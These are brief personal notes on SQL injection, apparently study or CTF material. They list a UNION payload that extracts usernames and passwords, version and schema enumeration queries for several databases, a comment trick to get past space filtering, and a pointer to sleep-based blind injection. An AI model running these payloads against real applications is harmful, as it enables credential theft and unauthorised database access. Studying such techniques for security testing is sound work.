# SQLi notes

To jump to other tables:
`' UNION SELECT username, password FROM users--`

Enumerate database columns
`SELECT * FROM information_schema.tables`

Enumerate vesrion:
`SELECT * FROM v$version`
`SELECT @@version`
`SELECT version()`
``

Quick tips:
space sanitisation can be defeated with `/**/`
sometimes adding a comment at the end of query can complete the injection `--` `#`

BlindSQL:
Truth must be "infered" generally with a sleep function
